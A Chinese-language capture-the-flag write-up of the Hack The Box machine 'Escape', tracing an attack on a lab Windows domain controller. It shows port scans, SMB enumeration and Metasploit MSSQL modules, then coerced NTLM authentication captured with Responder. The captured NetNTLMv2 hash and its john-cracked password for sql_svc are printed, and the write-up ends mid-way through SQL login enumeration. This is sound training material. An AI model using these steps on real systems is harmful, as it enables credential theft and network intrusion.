---
tags:
  - HTB/Windows
  - HTB/Medium
---

第一次打Windows的靶机……也是边打边学了。

---

## Summary

...

### Attack Path Overview

![attack-path](./../attackpath/HTB-Escape.png){ width='450' }


## 扫描

由于是Windows机器且是Medium，姑且扫一下全端口吧

```bash
└─$ export HTB_IP=10.10.11.202
└─$ sudo nmap -n -Pn -sS -p- --min-rate=10000 ${HTB_IP} | tee ${HTB_IP}_ports_all.nmap
└─$ export ports=$(cat "${HTB_IP}_ports_all.nmap" | grep ^[0-9] | cut -d / -f1 | tr '\n' ',' | sed s/,$//)
└─$ echo $ports
53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49687,49688,49705,49709,52722

└─$ sudo nmap -v -n -Pn -sV -O -p ${ports} ${HTB_IP} | tee "${HTB_IP}_baseScan.nmap"
……
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-01 09:36:12Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
52722/tcp open  msrpc         Microsoft Windows RPC

└─$ sudo nmap -n -Pn -sU --top-ports 20 ${HTB_IP} | tee "${HTB_IP}_ports_udp_top20.nmap"
PORT      STATE         SERVICE
53/udp    open          domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open          ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
```

vuln脚本扫描没什么结果。


## 端口分析、攻击路径规划

有DNS、Kerberos、LDAP，应该是个域控？  
域名疑似这个：sequel.htb0（后确认为“sequel.htb”）

感觉可以参考这个[APT靶机](./HTB-APT.md)。先看看445和135有什么信息。  
然后有1433的SQL，打进去之后可能可以枚举LDAP？


## 445端口

看一下共享列表
```bash
└─$ smbclient -L //${HTB_IP}
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share
```

从 `/Public` 下载了一个PDF，其他共享没有什么信息。

![HTB-Escape-445-pdf](./../evidence-img/HTB-Escape-445-pdf.png)

### 获得SQL临时凭据

PDF最下面有临时凭据（PublicUser:GuestUserCantWrite1），而端口1433就是SQL，等下尝试能否利用。

先继续看看135。


## 135端口

### rpcclient

```bash
└─$ rpcclient ${HTB_IP}
Password for [WORKGROUP\kali]:
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 4B D2 65 70 56 9D 82 DD   D0 D2 F9 26 F1 45 D7 66   K.epV... ...&.E.f
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

└─$ rpcclient ${HTB_IP} -p 135
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
```

### ([impacket](https://www.secureauth.com/labs/open-source-tools/impacket/)) rpcdump.py

为了方便，先修改PATH，把impacket的路径加进来：
```bash
└─$ which rpcdump rpcdump.py
rpcdump not found
rpcdump.py not found
└─$ echo $PATH                   
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games

└─$ export PATH=/usr/share/doc/python3-impacket/examples:$PATH
                                                                        
└─$ echo $PATH                                                
/usr/share/doc/python3-impacket/examples:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
└─$ which rpcdump rpcdump.py
rpcdump not found
/usr/share/doc/python3-impacket/examples/rpcdump.py
```

执行：`rpcdump.py ${HTB_IP} | tee ${HTB_IP}_rpcdump.txt`  
结果过于长就不粘贴了……

想想其实这一步对我来说也没有太大意义，可以直接跑 `rpcmap` 的。

### ([impacket](https://www.secureauth.com/labs/open-source-tools/impacket/)) rpcmap.py

```bash
└─$ rpcmap.py ncacn_ip_tcp:${HTB_IP}[135] | tee ${HTB_IP}_rpcmap.txt

└─$ rpcmap.py ncacn_ip_tcp:${HTB_IP}[135] -brute-uuids -brute-opnums | tee ${HTB_IP}_rpcmap_BF.txt
```

除去“Opnums 0-64: rpc_s_access_denied”和其他失败的，有显示成功的剩下2个：
```
Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
Opnum 0: rpc_x_bad_stub_data
Opnum 1: rpc_x_bad_stub_data
Opnum 2: rpc_x_bad_stub_data
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnum 5: success
Opnums 6-64: nca_s_op_rng_error (opnum not found)

Protocol: [MS-RPCE]: Remote Management Interface
Provider: rpcrt4.dll
UUID: AFA8BD80-7D8A-11C9-BEF4-08002B102989 v1.0
Opnum 0: success
Opnum 1: rpc_x_bad_stub_data
Opnum 2: success
Opnum 3: success
Opnum 4: rpc_x_bad_stub_data
Opnums 5-64: nca_s_op_rng_error (opnum not found)
```

谷歌一下[99FCFEC4-5260-101B-BBCB-00AA0021347A](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4)可以看到MS的文档，而Opnum 3和5：[ServerAlive](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/8ed0ae33-56a1-44b7-979f-5972f0e9416c)。

根据上述文档的名称，搜“IObjectExporter ServerAlive exploit”能发现[这篇文章](https://medium.com/nets3c/remote-enumeration-of-network-interfaces-without-any-authentication-the-oxid-resolver-896cff530d37)。似乎就是枚举IPv6的，里面有python脚本。  
执行结果：
```bash
└─$ python OXIDResolver.py        
[*] Retrieving network interface of 10.10.11.202
Address: dc
Address: 10.10.11.202
Address: dead:beef::3d3e:78e9:cea8:eac3
Address: dead:beef::1dc
```

nmap扫描一下端口，结果和之前的扫描没太大差别。  
根据APT靶机的套路先走到这，感觉这条路应该不太对，剩下那个UUID先放一放。  

先看看那个SQL凭据能否利用……


## 1433端口

根据nmap的版本扫描结果，尝试搜索“Microsoft SQL Server 2019 exploit”发现[hacktricks的文章](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)，先按照里面的内容试试。

### NES扫描失败
一开始直接报错还以为不行，仔细看了下说可以加上 `-Pn`。不过最后结果依旧是“ERROR: Script execution failed”。  
*后来在 `mssql.instance-name` 设置了一下“SQLMOCK”或者“master”，不过运行结果一样失败。*  
*memo：每个实例拥有自己独立的IP&端口组合，可以运行多个数据库。*

```bash
└─$ nmap -v -Pn --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=PublicUser,mssql.password=GuestUserCantWrite1,mssql.instance-name=MSSQLSERVER -sV -p 1433 ${HTB_IP} | tee ${HTB_IP}_1433_enum.nmap 
……
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ms-sql-empty-password: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
……
```

### [metasploit扫描](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#metasploit-need-creds)

msf扫描需要凭据，而之前正好收集到了SQL临时凭据。

由于用到的模块有点多，先配置一下全局参数会方便很多：
```
setg rhosts 10.10.11.202
setg username PublicUser
setg password GuestUserCantWrite1
```

#### msf> use admin/mssql/mssql_enum

##### 信息整理

2个用户：

- sa（这还是System Admin？但是这好像是msf模块的默认值，之前的误操作直接run了一下。为什么就算System Admin了？） 
    - *后来搜了一下，这是SQL Server用来管理SQL账户的，一个高权限但是一般默认禁用的账户。[参考link（日文）](https://sql-oracle.com/sqlserver/?p=1080)*
- PublicUser（即临时凭据）

4个数据库：

- master
- tempdb
- model
- msdb

*看[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#default-ms-sql-system-tables)了解到这是MSSQL的默认数据库*

关于[Stored Procedures](https://www.w3schools.com/sql/sql_stored_procedures.asp)。记得以前好像在哪里看过利用来着，姑且也把扫描结果记下来。

##### 扫描结果

```
[*] 10.10.11.202:1433 - Databases on the server:
[*] 10.10.11.202:1433 -         Database name:master
[*] 10.10.11.202:1433 -         Database Files for master:
[*] 10.10.11.202:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
[*] 10.10.11.202:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
[*] 10.10.11.202:1433 -         Database name:tempdb
[*] 10.10.11.202:1433 -         Database Files for tempdb:
[*] 10.10.11.202:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\tempdb.mdf
[*] 10.10.11.202:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\templog.ldf
[*] 10.10.11.202:1433 -         Database name:model
[*] 10.10.11.202:1433 -         Database Files for model:
[*] 10.10.11.202:1433 -         Database name:msdb
[*] 10.10.11.202:1433 -         Database Files for msdb:
[*] 10.10.11.202:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBData.mdf
[*] 10.10.11.202:1433 -                 C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf
[*] 10.10.11.202:1433 - System Logins on this Server:
[*] 10.10.11.202:1433 -         sa
[*] 10.10.11.202:1433 -         PublicUser
[*] 10.10.11.202:1433 - Disabled Accounts:
[*] 10.10.11.202:1433 -         No Disabled Logins Found
[*] 10.10.11.202:1433 - No Accounts Policy is set for:
[*] 10.10.11.202:1433 -         All System Accounts have the Windows Account Policy Applied to them.
[*] 10.10.11.202:1433 - Password Expiration is not checked for:
[*] 10.10.11.202:1433 -         sa
[*] 10.10.11.202:1433 -         PublicUser
[*] 10.10.11.202:1433 - System Admin Logins on this Server:
[*] 10.10.11.202:1433 -         sa
……
[*] 10.10.11.202:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.10.11.202:1433 -         sp_replsetsyncstatus
[*] 10.10.11.202:1433 -         sp_replcounters
[*] 10.10.11.202:1433 -         sp_replsendtoqueue
[*] 10.10.11.202:1433 -         sp_resyncexecutesql
[*] 10.10.11.202:1433 -         sp_prepexecrpc
[*] 10.10.11.202:1433 -         sp_repltrans
[*] 10.10.11.202:1433 -         sp_xml_preparedocument
[*] 10.10.11.202:1433 -         xp_qv
[*] 10.10.11.202:1433 -         xp_getnetname
[*] 10.10.11.202:1433 -         sp_releaseschemalock
[*] 10.10.11.202:1433 -         sp_refreshview
[*] 10.10.11.202:1433 -         sp_replcmds
[*] 10.10.11.202:1433 -         sp_unprepare
[*] 10.10.11.202:1433 -         sp_resyncprepare
[*] 10.10.11.202:1433 -         sp_createorphan
[*] 10.10.11.202:1433 -         xp_dirtree
[*] 10.10.11.202:1433 -         sp_replwritetovarbin
[*] 10.10.11.202:1433 -         sp_replsetoriginator
[*] 10.10.11.202:1433 -         sp_xml_removedocument
[*] 10.10.11.202:1433 -         sp_repldone
[*] 10.10.11.202:1433 -         sp_reset_connection
[*] 10.10.11.202:1433 -         xp_fileexist
[*] 10.10.11.202:1433 -         xp_fixeddrives
[*] 10.10.11.202:1433 -         sp_getschemalock
[*] 10.10.11.202:1433 -         sp_prepexec
[*] 10.10.11.202:1433 -         xp_revokelogin
[*] 10.10.11.202:1433 -         sp_execute_external_script
[*] 10.10.11.202:1433 -         sp_resyncuniquetable
[*] 10.10.11.202:1433 -         sp_replflush
[*] 10.10.11.202:1433 -         sp_resyncexecute
[*] 10.10.11.202:1433 -         xp_grantlogin
[*] 10.10.11.202:1433 -         sp_droporphans
[*] 10.10.11.202:1433 -         xp_regread
[*] 10.10.11.202:1433 -         sp_getbindtoken
[*] 10.10.11.202:1433 -         sp_replincrementlsn
[*] 10.10.11.202:1433 - Instances found on this server:
[*] 10.10.11.202:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.10.11.202:1433 -         xp_regread might be disabled in this system
```

#### msf> use admin/mssql/mssql_enum_domain_accounts

##### 信息整理

- SQL Server Name: DC
- Domain Name: sequel
- 31个账户（user accounts, groups, and computer accounts）
- 注意到hacktricks的[from-db_owner-to-sysadmin](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#from-db_owner-to-sysadmin)，不知道能否利用

##### 扫描结果

```
[*] 10.10.11.202:1433 - SQL Server Name: DC
[*] 10.10.11.202:1433 - Domain Name: sequel
[+] 10.10.11.202:1433 - Found the domain sid: 0105000000000005150000009d2c17f321e7f058e9821299
[*] 10.10.11.202:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.10.11.202:1433 -  - sequel\Administrator
[*] 10.10.11.202:1433 -  - sequel\Guest
[*] 10.10.11.202:1433 -  - sequel\krbtgt
[*] 10.10.11.202:1433 -  - sequel\Domain Admins
[*] 10.10.11.202:1433 -  - sequel\Domain Users
[*] 10.10.11.202:1433 -  - sequel\Domain Guests
[*] 10.10.11.202:1433 -  - sequel\Domain Computers
[*] 10.10.11.202:1433 -  - sequel\Domain Controllers
[*] 10.10.11.202:1433 -  - sequel\Cert Publishers
[*] 10.10.11.202:1433 -  - sequel\Schema Admins
[*] 10.10.11.202:1433 -  - sequel\Enterprise Admins
[*] 10.10.11.202:1433 -  - sequel\Group Policy Creator Owners
[*] 10.10.11.202:1433 -  - sequel\Read-only Domain Controllers
[*] 10.10.11.202:1433 -  - sequel\Cloneable Domain Controllers
[*] 10.10.11.202:1433 -  - sequel\Protected Users
[*] 10.10.11.202:1433 -  - sequel\Key Admins
[*] 10.10.11.202:1433 -  - sequel\Enterprise Key Admins
[*] 10.10.11.202:1433 -  - sequel\RAS and IAS Servers
[*] 10.10.11.202:1433 -  - sequel\Allowed RODC Password Replication Group
[*] 10.10.11.202:1433 -  - sequel\Denied RODC Password Replication Group
[*] 10.10.11.202:1433 -  - sequel\DC$
[*] 10.10.11.202:1433 -  - sequel\DnsAdmins
[*] 10.10.11.202:1433 -  - sequel\DnsUpdateProxy
[*] 10.10.11.202:1433 -  - sequel\Tom.Henn
[*] 10.10.11.202:1433 -  - sequel\Brandon.Brown
[*] 10.10.11.202:1433 -  - sequel\Ryan.Cooper
[*] 10.10.11.202:1433 -  - sequel\sql_svc
[*] 10.10.11.202:1433 -  - sequel\James.Roberts
[*] 10.10.11.202:1433 -  - sequel\Nicole.Thompson
[*] 10.10.11.202:1433 -  - sequel\SQLServer2005SQLBrowserUser$DC
[+] 10.10.11.202:1433 - 31 user accounts, groups, and computer accounts were found.
```

#### msf> use admin/mssql/mssql_enum_sql_logins

##### 信息整理

- 不知道带井号的用户是怎么回事
- sequel\Administrator登陆过这个的意思？不知道会不会留下凭据能利用什么的

##### 扫描结果

```
[+] 10.10.11.202:1433 - 17 SQL Server logins were verified:
[*] 10.10.11.202:1433 -  - ##MS_AgentSigningCertificate##
[*] 10.10.11.202:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 10.10.11.202:1433 -  - ##MS_PolicySigningCertificate##
[*] 10.10.11.202:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 10.10.11.202:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 10.10.11.202:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 10.10.11.202:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 10.10.11.202:1433 -  - ##MS_SmoExtendedSigningCertificate##
[*] 10.10.11.202:1433 -  - BUILTIN\Users
[*] 10.10.11.202:1433 -  - NT AUTHORITY\SYSTEM
[*] 10.10.11.202:1433 -  - NT SERVICE\SQLTELEMETRY$SQLMOCK
[*] 10.10.11.202:1433 -  - NT SERVICE\SQLWriter
[*] 10.10.11.202:1433 -  - NT SERVICE\Winmgmt
[*] 10.10.11.202:1433 -  - NT Service\MSSQL$SQLMOCK
[*] 10.10.11.202:1433 -  - PublicUser
[*] 10.10.11.202:1433 -  - sa
[*] 10.10.11.202:1433 -  - sequel\Administrator
```

#### msf> use auxiliary/admin/mssql/mssql_findandsampledata

无有用信息。

#### msf> use auxiliary/scanner/mssql/mssql_hashdump

##### 信息整理

- Instance Name: "SQLMOCK"

##### 扫描结果

```
[*] 10.10.11.202:1433     - Instance Name: "SQLMOCK"
```

#### msf> use auxiliary/scanner/mssql/mssql_schemadump

无有用信息。

#### msf> use auxiliary/admin/mssql/mssql_ntlm_stealer

应该是只有NTLMv1我们才能破解。不过姑且先拿了。

根据hacktricks的[steal-netntlm-hash-relay-attack](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack)，要开启Responder，不过在这之前配置一下conf，将挑战值改为固定的 `Challenge = 1122334455667788`（NTLMv1的话弄这步会易破解些，不知道NTLMv2会不会也是）
```bash
└─$ sudo vim /etc/responder/Responder.conf
```

*尝试降级NTLM认证，不过没收到响应*  
> [If you are using responder you could try to **use the flag --lm ** to try to downgrade the authentication.](https://book.hacktricks.xyz/windows-hardening/ntlm#ntlmv1-attack)

正常开启Responder监听：
```bash
└─$ sudo responder -I tun0 -v
```

*如果之前捕获过NTLM响应的话不加 `-v` 选项则会跳过：*
> [*] Skipping previously captured hash  
> If you wish to keep seeing the hashes for same user add the v option.

msf模块还有个额外的参数 `SMBPROXY`，配置为tun0的IP后运行模块。  
Responder收到响应（log保存在 `/usr/share/responder/logs/`）：  
```
[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1122334455667788:1DB61AB04018DE6DB8FEEF810636E9CD:010100000000000080D9D4393B95D901746A11FB7DBD1278000000000200080046004B004900510001001E00570049004E002D003500330033004100440050003400310042003800490004003400570049004E002D00350033003300410044005000340031004200380049002E0046004B00490051002E004C004F00430041004C000300140046004B00490051002E004C004F00430041004C000500140046004B00490051002E004C004F00430041004C000700080080D9D4393B95D901060004000200000008003000300000000000000000000000003000003C07B4878B999156F7276A845E9C66C484700A331A7AAC98EBB52896F0F737080A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310030000000000000000000
```

姑且将其扔给john，继续考虑其他攻击路径。


## 中场休息，整理思路

其实一开始注意到PDF里面提到非域机器访问MSSQL也需要[下载SSMS](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16)，点了一下是个exe文件。由于没准备Windows机器所以就暂时放置了。

打到现在，感觉这个NTLMv2 Hash应该破解不了，而且这个似乎并不需要破解，应该是可以直接relay利用的。

- 以及在hacktricks里翻看[1433端口的NTLM relay](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack)时，从[NTLM的强制认证](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#force-ntlm-logins)里注意到[Inside Windows - MSSQL](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse#inside-windows)，提到如果在Windows机器里的话，可以强制Windows使用特权账户连接到服务器。那么可能的攻击路径就是先进MSSQL里，然后强制认证获取特权账户的NTLMv2 Hash，然后不用暴破直接relay以获取特权账户？
- 不过又看到这个[MultiRelay](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#multirelay)写到“默认返回一个shell”。所以我们可以不连接MSSQL，用NTLM relay获得shell？

**但是我突然意识到，好像没有可以relay的目标……？以及没有本地管理员账号**  
> Please, note that the relayed authentication must be from a user which has Local Admin access to the relayed host


## john意外暴破成功，获得1个域用户凭据

之前用的是默认字典，虽然数量少但是也非常耗时的样子，不抱什么希望地姑且放在后台跑着了。  
然而在hacktricks翻看[NTLM相关利用](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks#running-responder)的过程中，看到说NTLMv2可以指定 `--format=netntlmv2`。一边想着似乎本身john也识别出是“netntlmv2”了啊，应该不用指定也没事吧，一边又重新试了下，竟然秒破！？

```bash
└─$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt SMB-NTLMv2-SSP-10.10.11.202.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)     
1g 0:00:00:02 DONE (2023-06-02 10:20) 0.3546g/s 3795Kp/s 3795Kc/s 3795KC/s RENZOJAVIER..RBDesloMEJOR
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

瞬间出结果，还以为是因为这个密码在字典里非常靠前，确认了一下也不是啊。  
原来我还是低估了john的速度，看来只要指定好format还是非常迅速的……
```
└─$ grep -n "REGGIE1234ronnie" /usr/share/wordlists/rockyou.txt
10700144:REGGIE1234ronnie

└─$ wc -l /usr/share/wordlists/rockyou.txt
14344392 /usr/share/wordlists/rockyou.txt
```

所以我们获得新凭据，sequel/sql_svc:REGGIE1234ronnie。

- 但是要如何使用呢？  
- 这是个什么权限呢？  
- 要是说登录MSSQL的话，又回到要下载SSMS的问题上了。
- 应该可以用这个账户看看SMB？  
- 途中也尝试了下用这个凭据跑上面的msf模块，但是都说登录失败……（后来发现是配置错误，参照后文）


## 利用新凭据的探索之路

### SMB

先smbmap看一眼：
```bash
└─$ smbmap -u sql_svc -d sequel -p 'REGGIE1234ronnie' -H ${HTB_IP}
[+] IP: 10.10.11.202:445        Name: 10.10.11.202                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Public                                                  READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

看了下只有 `/SYSVOL` 里有东西：
```bash
└─$ smbclient //${HTB_IP}/SYSVOL -U sequel/sql_svc --password=REGGIE1234ronnie
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 18 12:11:44 2022
  ..                                  D        0  Fri Nov 18 12:11:44 2022
  sequel.htb                         Dr        0  Fri Nov 18 12:11:44 2022
```

文件夹有点多的样子，于是参考[这里的命令](https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient)，递归下载所有文件：
```bash
└─$ mkdir sequel.htb; cd $_

└─$ smbclient "//${HTB_IP}/SYSVOL" -U sequel/sql_svc --password=REGGIE1234ronnie -c 'prompt OFF;recurse ON;cd "sequel.htb";mget *'
```

然后看了下只有Policies文件夹里有东西，不会是要分析这个吧……
```bash
└─$ ls *                                                               
{31B2F340-016D-11D2-945F-00C04FB984F9}:
GPT.INI  MACHINE  USER

{6AC1786C-016F-11D2-945F-00C04fB984F9}:
GPT.INI  MACHINE  USER
```

看了下较可疑的只是 `{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol` 里出现“Administrator@sequel”的字样，但是 `cat` 的话是乱码，`strings` 也没发现特别的信息。

### 登陆MSSQL

万策尽……想着难道只能下载SSMS才能登陆MSSQL吗？于是搜索MSSQL的登陆方法，翻翻找找又回到hacktricks，这次才注意到原来里面写了可以用 `mssqlclient.py` 登陆。

由于第一次用这个，有些选项不是很懂就试了下：`mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>`  
看help里面的这个解释有点让人疑惑，还以为“instance”是指之前枚举出来的“SQLMOCK”呢。结果试了下就是数据库名（master、tempdb、model、msdb）  
> -db DB &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MSSQL database instance

而 `-windows-auth` 虽然不太确定具体的意思，不过最初从SMB共享收集到的PDF里也提到，那个临时凭据就是不用Windows认证，要用SQL服务器认证。可能一个是SQL服务器内部的认证，一个是AD域认证？  
*后来搜了一下，原来这是SQL Server提供的两种认证模式：[MS文档](https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms144284(v=sql.105))*


#### 测试

```bash
└─$ mssqlclient.py sequel/sql_svc:REGGIE1234ronnie@${HTB_IP}              
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ERROR(DC\SQLMOCK): Line 1: Login failed for user 'sql_svc'.


└─$ mssqlclient.py -windows-auth sequel/sql_svc:REGGIE1234ronnie@${HTB_IP}
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> exit


└─$ mssqlclient.py -db SQLMOCK -windows-auth sequel/sql_svc:REGGIE1234ronnie@${HTB_IP}
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ERROR(DC\SQLMOCK): Line 1: Cannot open database "SQLMOCK" requested by the login. The login failed.
[-] ERROR(DC\SQLMOCK): Line 1: Login failed for user 'sequel\sql_svc'.


└─$ mssqlclient.py PublicUser:GuestUserCantWrite1@${HTB_IP}
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> exit
```

#### 登陆

`mssqlclient.py -windows-auth sequel/sql_svc:REGGIE1234ronnie@${HTB_IP}`

```sql
SQL> ?

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd

SQL> xp_cmdshell whoami
[-] ERROR(DC\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
```

#### 手动枚举

- MSSQL这个返回格式是真的丑啊
- 这用户竟然只是个guest……
- sa用户没被禁用，且密码为空！但是试了下 `mssqlclient.py sa@${HTB_IP} -no-pass` 又无法登陆，不懂为什么……【甚至怀疑这个有效是之前的玩家留下的，但是看修改时间又是挺久之前的……后来重置了一下靶机确认，的确就是“Enabled”】

##### log

```sql
SQL> select user_name();
                                                                                                                                   

--------------------------------------------------------------------------------------------------------------------------------   

guest

SQL> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
login                                                                                                                              login_type                                                                                                                                                                                                                                                                                                       password_hash   create_date   modify_date   status     

--------------------------------------------------------------------------------------------------------------------------------   ------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   -----------   --------   

